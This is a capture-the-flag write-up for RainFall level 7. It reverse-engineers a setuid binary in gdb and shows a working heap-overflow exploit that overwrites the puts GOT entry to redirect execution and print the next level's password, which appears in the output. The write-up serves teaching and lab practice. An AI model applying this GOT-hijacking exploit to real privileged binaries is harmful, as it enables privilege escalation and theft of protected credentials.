# Level 7

## Initial Analysis
### 1. Examine the Binary

```bash
level7@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level7 level7   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level7 level7  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level7 level7 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level8 users  5252 Mar  6  2016 level7
-rw-r--r--+ 1 level7 level7   65 Sep 23  2015 .pass
-rw-r--r--  1 level7 level7  675 Apr  3  2012 .profile

level7@RainFall:~$ file level7
level7: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf182f1cf7b055fcf322ee69b71fc52887cd77587, not stripped
```

**Key observations:**

- setuid and setgid binary (s flags in permissions)
- Owned by **level8** user
- When executed, runs with level8 privileges

### 2. Test Basic Execution Behavior
```bash
level7@RainFall:~$ ./level7
Segmentation fault

level7@RainFall:~$ ./level7 hello
Nope

level7@RainFall:~$ ./level7 test_argument second
Nope

level7@RainFall:~$ ./level7 first second third
Nope
```
**Critical Observations:**

- No arguments: Segmentation fault (tries to access argv[1] when it doesn't exist)

- With one argument: Still crashes? Let's check carefully

- With two arguments: Prints "Nope" and exits

- With three arguments: Still prints "Nope" (only first two are used)

- Pattern: Program expects two command-line arguments

## Reverse Engineering - Understanding the Hidden Architecture
### 3. Function Analysis - Discovering the Complete Picture
```bash
level7@RainFall:~$ gdb level7
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x08048340  strcpy@plt
0x08048350  malloc@plt      ← Dynamic memory allocation
0x08048360  puts@plt        ← Used for "Nope" output
0x08048370  system@plt      ← System call available!
0x080484f4  m               ← Function #1 (same as level6's n)
0x08048521  main
```

### 4. Analyzing the Hidden Function
```bash
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x18,%esp
   0x080484fa <+6>:     movl   $0x0,(%esp)         # time(NULL)
   0x08048501 <+13>:    call   0x80483d0 <time@plt>
   0x08048506 <+18>:    mov    $0x80486e0,%edx     # Format string: "%s - %d\n"
   0x0804850b <+23>:    mov    %eax,0x8(%esp)      # time value
   0x0804850f <+27>:    movl   $0x8049960,0x4(%esp) # Password buffer! ⭐
   0x08048517 <+35>:    mov    %edx,(%esp)         # Format string
   0x0804851a <+38>:    call   0x80483b0 <printf@plt>  # printf() call
   0x0804851f <+43>:    leave  
   0x08048520 <+44>:    ret    
End of assembler dump.
```
**Critical Discovery:**

- Function m() at 0x080484f4 prints the password buffer at 0x8049960!

- In level7, m() is the target function that prints the password

### 5. Finding the Password Buffer
```bash
(gdb) x/s 0x8049960
0x8049960:      ""
(gdb) x/s 0x80486e0
0x80486e0:      "%s - %d\n"
```

- Password Location Confirmed:

- Password is read from file into global buffer at 0x8049960

- Function m() prints this buffer with a timestamp

## Understanding the Program Architecture

### 6. Main Function Deep Dive - The Heap Allocation Pattern

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x08048521 <+0>:     push   %ebp
   0x08048522 <+1>:     mov    %esp,%ebp
   0x08048524 <+3>:     and    $0xfffffff0,%esp
   0x08048527 <+6>:     sub    $0x20,%esp
   0x0804852a <+9>:     movl   $0x8,(%esp)          # malloc(8) - Node 1
   0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:    mov    %eax,0x1c(%esp)      # Store node1 ptr
   0x0804853a <+25>:    mov    0x1c(%esp),%eax
   0x0804853e <+29>:    movl   $0x1,(%eax)          # node1->value = 1
   0x08048544 <+35>:    movl   $0x8,(%esp)          # malloc(8) - Node 2
   0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:    mov    %eax,%edx
   0x08048552 <+49>:    mov    0x1c(%esp),%eax
   0x08048556 <+53>:    mov    %edx,0x4(%eax)       # node1->next = node2
   0x08048559 <+56>:    movl   $0x8,(%esp)          # malloc(8) - Node 3
   0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:    mov    %eax,0x18(%esp)      # Store node3 ptr
   0x08048569 <+72>:    mov    0x18(%esp),%eax
   0x0804856d <+76>:    movl   $0x2,(%eax)          # node3->value = 2
   0x08048573 <+82>:    movl   $0x8,(%esp)          # malloc(8) - Node 4
   0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:    mov    %eax,%edx
   0x08048581 <+96>:    mov    0x18(%esp),%eax
   0x08048585 <+100>:   mov    %edx,0x4(%eax)       # node3->next = node4
   
   0x08048588 <+103>:   mov    0xc(%ebp),%eax       # argv
   0x0804858b <+106>:   add    $0x4,%eax            # argv[1]
   0x0804858e <+109>:   mov    (%eax),%eax          # Load argv[1]
   0x08048590 <+111>:   mov    %eax,%edx            # Source = argv[1]
   0x08048592 <+113>:   mov    0x1c(%esp),%eax      # node1 ptr
   0x08048596 <+117>:   mov    0x4(%eax),%eax       # node1->next (node2)
   0x08048599 <+120>:   mov    %edx,0x4(%esp)       # Push source
   0x0804859d <+124>:   mov    %eax,(%esp)          # Push dest (node2)
   0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>  # strcpy(node2, argv[1])
   
   0x080485a5 <+132>:   mov    0xc(%ebp),%eax       # argv
   0x080485a8 <+135>:   add    $0x8,%eax            # argv[2]
   0x080485ab <+138>:   mov    (%eax),%eax          # Load argv[2]
   0x080485ad <+140>:   mov    %eax,%edx            # Source = argv[2]
   0x080485af <+142>:   mov    0x18(%esp),%eax      # node3 ptr
   0x080485b3 <+146>:   mov    0x4(%eax),%eax       # node3->next (node4)
   0x080485b6 <+149>:   mov    %edx,0x4(%esp)       # Push source
   0x080485ba <+153>:   mov    %eax,(%esp)          # Push dest (node4)
   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>  # strcpy(node4, argv[2])
   
   0x080485c2 <+161>:   mov    $0x80486e9,%edx      # "/home/user/level8/.pass"
   0x080485c7 <+166>:   mov    $0x80486eb,%eax      # "r" (read mode)
   0x080485cc <+171>:   mov    %edx,0x4(%esp)       # Push filename
   0x080485d0 <+175>:   mov    %eax,(%esp)          # Push mode
   0x080485d3 <+178>:   call   0x8048430 <fopen@plt>  # fopen()
   0x080485d8 <+183>:   mov    %eax,0x8(%esp)       # Store FILE*
   0x080485dc <+187>:   movl   $0x44,0x4(%esp)      # 68 bytes to read
   0x080485e4 <+195>:   movl   $0x8049960,(%esp)    # Global buffer
   0x080485eb <+202>:   call   0x80483c0 <fgets@plt>  # fgets(buffer, 68, file)
   0x080485f0 <+207>:   movl   $0x8048703,(%esp)    # "~~" string
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>  # puts("~~") - HIJACK TARGET!
   0x080485fc <+219>:   mov    $0x0,%eax
   0x08048601 <+224>:   leave
   0x08048602 <+225>:   ret
```

**Program Architecture Revelation:**

- 4 malloc(8) calls: Creates two linked list nodes (node1→node2, node3→node4)

- First strcpy: Copies argv[1] into node2 buffer (8 bytes max)

- Second strcpy: Copies argv[2] into node4 buffer (8 bytes max)

- fopen/fgets: Reads password from /home/user/level8/.pass into 0x8049960

- puts("~~"): Prints "~~" - THIS IS OUR TARGET FOR HIJACKING

## The Vulnerability - Heap-Based Function Pointer Hijacking
### 7. Understanding the Memory Layout
```text
Heap Memory Layout:

Node 1 (8 bytes):          Node 2 (8 bytes):
┌──────────┬──────────┐    ┌──────────┬──────────┐
│ value=1  │  next    │───→│  buffer  │  next    │
│ (4 bytes)│ (4 bytes)│    │ (8 bytes)│ (4 bytes)│
└──────────┴──────────┘    └──────────┴──────────┘
                              ↑
                           argv[1] copied here
                           (can overflow!)

Node 3 (8 bytes):          Node 4 (8 bytes):
┌──────────┬──────────┐    ┌──────────┬──────────┐
│ value=2  │  next    │───→│  buffer  │  next    │
│ (4 bytes)│ (4 bytes)│    │ (8 bytes)│ (4 bytes)│
└──────────┴──────────┘    └──────────┴──────────┘
                              ↑
                           argv[2] copied here
                           (destination can be hijacked!)
```

**The Vulnerability:**

- Node2 is only 8 bytes but strcpy can write beyond it

- Node3's next pointer is stored in heap metadata adjacent to node2

- First overflow can overwrite node3's next pointer

- Second strcpy will then write to whatever node3->next points to

- Target: Redirect second strcpy to write to puts@got

## 8. Finding the GOT Entry for puts
```bash
level7@RainFall:~$ objdump -R level7 | grep puts
08049828 R_386_JUMP_SLOT   puts
GOT Entry Confirmed:

puts@got: 0x8049828
```

- This is where the real address of puts() is stored

- Overwrite this with address of m() to hijack execution

### 9. Finding the Target Function Address
```bash
(gdb) info address m
Symbol "m" is at 0x80484f4 in a file compiled without debugging.
Target Function:

m() address: 0x080484f4
```

- This function prints the password buffer!

## Exploitation Strategy - GOT Hijacking via Heap Overflow
### 10. The Attack Plan
```text
Normal Execution Flow:
strcpy(node2, argv[1]) → strcpy(node4, argv[2]) → puts("~~") → exit
```
**Exploited Execution Flow:**
- 1. First strcpy overflows node2, overwrites node3->next with puts@got
- 2. Second strcpy now writes to puts@got instead of node4
- 3. argv[2] contains address of m()
- 4. puts@got now points to m()
- 5. puts("~~") actually calls m() which prints the password!

**Key Components:**
- First argument: 20 bytes filler + puts@got address (to overwrite node3->next)
- Second argument: m() address (to write to puts@got)
### 11. Finding the Overflow Offset
```bash
level7@RainFall:~$ gdb level7
(gdb) run $(python -c 'print "A"*20 + "BBBB"') test
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```
**Offset Confirmation:**

- 20 bytes of "A" fill node2 buffer (8 bytes) + heap metadata (12 bytes)

- "BBBB" (0x42424242) overwrites node3->next pointer

- Crash at 0x42424242 confirms we control the pointer!

### 12. Crafting the Exploit Payload
```bash
level7@RainFall:~$ ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```
**Payload Breakdown:**

- First argument: Overflow node2 to overwrite node3->next with puts@got
- puts@got: 0x8049828 (little-endian: \x28\x99\x04\x08)
- Need 20 bytes of padding + the address
- Second argument: Address of m() to write to puts@got
- m(): 0x080484f4 (little-endian: \xf4\x84\x04\x08)
```text
First argument (argv[1]):
┌──────────────────────┬──────────────────┐
│ 20 bytes of filler   │ puts@got address │
│ "A"*20               │  \x28\x99\x04\x08│
└──────────────────────┴──────────────────┘
  Fills node2 buffer    Overwrites node3->next
  (8 bytes) + gap       to point to puts@got

Second argument (argv[2]):
┌──────────────────────┐
│ m() address          │
│ \xf4\x84\x04\x08      │
└──────────────────────┘
  Gets written to puts@got
```
## 13. Execute the Exploit
```bash
level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
        ^
        Password printed directly!
```
**Success Analysis:**

- First strcpy: Copies 20 A's + puts@got address into node2

- Overflow: Overwrites node3->next to point to 0x8049828 (puts@got)

- Second strcpy: Uses corrupted node3->next as destination

- GOT overwrite: Writes 0x080484f4 (m() address) to puts@got

- puts("~~"): Now jumps to m() instead of real puts()

- m() executes: Prints password buffer with timestamp

- Flag retrieved: Got the password for level8!

## Understanding the Exploit Mechanics
### 14. Memory State Visualization
**Before Overflow:**

```text
Heap State:
Node1: [value=1][next→node2]
Node2: [buffer(empty)][next]
Node3: [value=2][next→node4]
Node4: [buffer(empty)][next]

GOT: puts@0x8049828 → [real_puts_address]
After First strcpy (overflow):
```
```text
Node2: [AAAAAAAA][AAAAAAAA][AAAAAAAA][\x28\x99\x04\x08]
                          ↑
                      Overwrites node3->next!
Node3: [value=2][next→0x8049828]  ← Now points to puts@got!
After Second strcpy:
```
```text
strcpy(0x8049828, argv[2]) where argv[2] = \xf4\x84\x04\x08
GOT: puts@0x8049828 → [0x080484f4]  ← Now points to m()!
```
**Final Execution:**

```text
puts("~~") → jumps to 0x080484f4 → m() → prints password!
```